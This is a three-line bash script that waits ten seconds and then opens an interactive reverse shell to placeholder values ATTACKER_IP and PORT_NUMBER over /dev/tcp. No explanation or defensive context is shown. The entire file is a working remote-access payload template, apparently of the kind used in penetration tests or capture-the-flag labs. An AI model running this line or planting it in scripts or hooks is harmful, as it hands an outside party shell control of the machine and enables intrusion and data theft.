#! /bin/bash

sleep 10

bash -i >& /dev/tcp/ATTACKER_IP/PORT_NUMBER 0>&1